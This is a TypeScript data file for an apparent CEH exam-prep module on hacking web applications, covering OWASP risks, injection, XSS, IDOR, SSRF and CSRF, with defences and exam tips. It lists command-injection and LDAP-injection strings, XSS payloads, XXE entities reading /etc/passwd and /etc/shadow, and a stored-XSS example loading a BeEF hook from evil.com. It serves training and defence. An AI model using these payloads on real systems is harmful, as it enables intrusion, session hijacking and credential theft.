import type { Module } from '../cehModules';

export const m14: Module = {
  id: 'm14',
  number: 'M14',
  title: 'Hacking Web Applications',
  description: 'Deep dive into the OWASP Top 10 and advanced web application exploitation. Understand how modern web frameworks handle input, authentication, and state. Master the identification and exploitation of Cross-Site Scripting (XSS), Command Injection, Insecure Direct Object References (IDOR), Server-Side Request Forgery (SSRF), and XML External Entity (XXE) attacks to compromise web platforms and their underlying databases.',
  examWeight: '7%',
  estimatedQuestions: 9,
  duration: '4h 30m',
  topics: [
    {
      id: 'm14-t01',
      title: 'Web Application Architecture & OWASP',
      content: 'Web applications are complex distributed architectures typically consisting of a front-end (client-side browser executing JavaScript/WASM), a back-end server (application logic in Node.js, Python, Java, PHP), and a database tier. The Open Web Application Security Project (OWASP) maintains the "Top 10," a critical industry-standard document outlining the most prevalent and dangerous web application security risks. Understanding this document is mandatory for the CEH exam.',
      keyPoints: [
        'Client-Side vs Server-Side: Client-side code (HTML, CSS, JS) executes in the user\'s browser and CANNOT be trusted. Attackers can bypass any client-side validation using tools like Burp Suite. Server-side code must independently validate all input.',
        'OWASP Top 10 (2021 Updates): A1: Broken Access Control (moved from #5 to #1), A2: Cryptographic Failures (formerly Sensitive Data Exposure), A3: Injection (now includes XSS), A4: Insecure Design (new category focusing on threat modeling), A5: Security Misconfiguration, A6: Vulnerable and Outdated Components, A7: Identification and Authentication Failures, A8: Software and Data Integrity Failures (includes CI/CD pipeline attacks), A9: Security Logging and Monitoring Failures, A10: Server-Side Request Forgery (SSRF).',
        'Web Application Firewall (WAF): A security control placed in front of web applications to inspect Layer 7 traffic and block common attacks (SQLi, XSS) based on signatures and behavioral analysis.',
      ],
    },
    {
      id: 'm14-t02',
      title: 'Injection Attacks (OS, LDAP, XXE)',
      content: 'Injection occurs when untrusted data is sent to an interpreter as part of a command or query. While SQL Injection (covered deeply in M15) is the most famous, injection flaws affect many other interpreters and parsers, leading to Remote Code Execution (RCE) or massive data breaches.',
      commands: [
        { command: '127.0.0.1; cat /etc/passwd', description: 'OS Command Injection: Appending a second command using the `;` operator in a ping or network utility feature' },
        { command: '127.0.0.1 | whoami', description: 'OS Command Injection: Using the pipe `|` operator to execute the second command instead of the first' },
        { command: 'admin*)(|(password=*))', description: 'LDAP Injection: Bypassing authentication by altering the LDAP filter query logic' },
      ],
      keyPoints: [
        'Command Injection (OS Injection): Exploiting a web application that executes OS-level commands (e.g., `ping`, `nslookup`) by appending malicious shell commands using operators like `;`, `&&`, or `|`.',
        'LDAP Injection: Manipulating input used to query LDAP directories to bypass authentication or extract Active Directory information.',
        'XML External Entity (XXE) Injection: Exploiting poorly configured XML parsers. Attackers inject external entity references (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) within an XML document. When the server parses it, it reads the local file, executes SSRF, or causes a Billion Laughs DoS attack.',
        'HTML Injection: Injecting legitimate HTML tags to deface a page or create fraudulent login forms. Unlike XSS, it does not execute JavaScript, but relies on visual deception.',
      ],
    },
    {
      id: 'm14-t03',
      title: 'Cross-Site Scripting (XSS)',
      content: 'XSS occurs when an application includes untrusted data in a web page without proper validation or output encoding. This allows attackers to execute malicious JavaScript within the context of the victim\'s browser session, leading to session hijacking, defacement, or redirection to malicious sites.',
      commands: [
        { command: '<script>alert(document.cookie)</script>', description: 'The classic XSS payload to prove JavaScript execution and extract the session cookie' },
        { command: '<img src=x onerror=alert(1)>', description: 'XSS payload using an HTML attribute event handler to bypass simple <script> tag filters' },
        { command: '"><svg/onload=prompt(1)>', description: 'Breaking out of an HTML attribute context to execute JavaScript via SVG tags' },
        { command: 'javascript:alert(1)', description: 'XSS payload used in `href` attributes (e.g., `<a href="javascript:alert(1)">Click Me</a>`)' },
      ],
      keyPoints: [
        'Reflected XSS (Non-Persistent): The malicious script is bounced (reflected) off the web server, such as in an error message or search result parameter. Requires social engineering (getting the victim to click a crafted link).',
        'Stored XSS (Persistent): The malicious script is permanently stored on the target server (e.g., in a forum post, profile bio, or comment section). ANY user viewing the infected page automatically executes the script. Highly dangerous.',
        'DOM-based XSS: The vulnerability exists purely in the client-side JavaScript (Document Object Model) manipulating the page dynamically. The payload may never actually reach the back-end web server (e.g., reading from `window.location.hash`).',
        'Impact: Session hijacking (stealing cookies via `document.cookie`), keylogging the user\'s input on the page, forcing actions (CSRF-like behavior), or deploying the BeEF (Browser Exploitation Framework) hook to control the victim\'s browser.',
      ],
    },
    {
      id: 'm14-t04',
      title: 'Broken Access Control & IDOR',
      content: 'Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data. It is currently the #1 risk on the OWASP Top 10.',
      keyPoints: [
        'Insecure Direct Object References (IDOR): A severe access control vulnerability where an application provides direct access to objects based on user-supplied input without verifying authorization. Example: Changing `user_id=100` to `user_id=101` in a URL to view another user\'s private profile or bank statement.',
        'Vertical Privilege Escalation: A standard user exploiting logic flaws to gain administrative rights (e.g., forcefully navigating to `/admin_panel` or changing a hidden `is_admin=false` POST parameter to `true`).',
        'Horizontal Privilege Escalation: A standard user accessing another standard user\'s data (this is exactly what IDOR achieves).',
        'Missing Function Level Access Control: When an application hides UI buttons for admin functions but fails to enforce server-side checks if a standard user directly requests the backend API endpoint (e.g., `POST /api/deleteUser`).',
      ],
    },
    {
      id: 'm14-t05',
      title: 'Server-Side Request Forgery (SSRF) & CSRF',
      content: 'While similar in acronym, SSRF and CSRF target entirely different systems. SSRF targets the server infrastructure, while CSRF targets the victim\'s browser session.',
      keyPoints: [
        'Server-Side Request Forgery (SSRF): An attacker forces the vulnerable web server to make an HTTP request on their behalf. Used to scan internal networks, bypass firewalls, or access cloud metadata endpoints (e.g., AWS `169.254.169.254`) that are only accessible from the server itself.',
        'Cross-Site Request Forgery (CSRF): An attacker forces a logged-in victim\'s browser to send a forged state-changing request (e.g., transferring funds, changing a password) to a vulnerable web application. The browser automatically includes the victim\'s session cookies, making the request appear legitimate.',
        'CSRF Defense: Anti-CSRF Tokens (unique, unpredictable values required for state-changing requests) and the `SameSite` cookie attribute.',
        'SSRF Defense: Validating all user-supplied URLs against a strict allowlist of domains, disabling URL redirection following, and implementing strict egress firewall rules.',
      ],
    },
  ],
  keyTools: ['Burp Suite Professional', 'OWASP ZAP', 'BeEF', 'Commix', 'Wfuzz', 'Postman'],
  countermeasures: [
    'Input Validation: Validate all input against a strict allowlist of expected characters, types, and formats. Reject everything else.',
    'Output Encoding: Escape all user-supplied data before rendering it in the HTML context to prevent XSS (e.g., convert `<` to `&lt;`, `>` to `&gt;`). Contextual encoding is required (HTML, JavaScript, CSS).',
    'Parameterized Queries (Prepared Statements): The absolute best defense against SQL and other injection attacks.',
    'Implement robust Access Control matrices checked on EVERY single request at the server level, not just during login. Do not rely on hidden UI elements for security.',
    'Use indirect object references (e.g., random UUIDs like `usr_8f7b...`) instead of sequential integers (`id=4`) to prevent IDOR enumeration.',
    'Set the `HttpOnly` flag on session cookies to prevent JavaScript (and thus XSS) from reading them. Set the `Secure` flag to ensure they are only sent over HTTPS.',
    'Implement Anti-CSRF tokens for all state-changing operations (POST, PUT, DELETE).',
  ],
  examTips: [
    'XSS executes on the CLIENT side (in the victim\'s browser). Command/SQL/XXE Injection executes on the SERVER side.',
    'Reflected XSS requires the victim to click a link (social engineering). Stored XSS does not — it is saved on the server and executes automatically. Stored is more dangerous.',
    'IDOR is changing a parameter (like an ID) to access someone else\'s data without authorization (Horizontal Privilege Escalation).',
    'SSRF forces the SERVER to make a request to an internal network resource. CSRF forces the USER\'S BROWSER to make a forged request.',
    'XXE (XML External Entity) attacks exploit XML parsers to read local server files (`/etc/passwd`) or conduct SSRF.',
    'Input validation is good, but Output Encoding is the primary defense against XSS. Prepared Statements are the primary defense against SQLi.',
  ],
  realWorldScenarios: [
    'You are assessing a healthcare application. You notice your appointment URL is `clinic.com/records?patient_id=4551`. You change the ID to `4552` and the server returns the medical records of a different patient. This is a critical IDOR vulnerability resulting in a massive HIPAA violation.',
    'A forum allows users to post comments. An attacker posts `<script src="http://evil.com/beef_hook.js"></script>`. Because the server does not output-encode the input (Stored XSS), every user who views that comment section executes the script, silently hooking their browsers into the attacker\'s BeEF control panel.',
    'An application allows users to upload XML files for bulk data processing. You craft an XML payload containing `<!ENTITY xxe SYSTEM "file:///etc/shadow">`. When the server parses the XML, the XXE vulnerability forces it to embed the contents of the Linux shadow password file into the application response.',
    'While analyzing an e-commerce site, you notice a parameter: `stockCheck?apiUrl=http://api.internal/stock/1`. You modify the parameter to `http://192.168.1.1:8080/admin`. The web server makes the request on your behalf (SSRF), bypassing the external firewall and granting you access to the internal router\'s admin panel.',
  ],
  prerequisites: ['M11 — Session Hijacking concepts are tightly integrated with XSS and CSRF attacks.', 'M13 — Understanding web servers is the foundation for understanding the applications running on them.'],
};
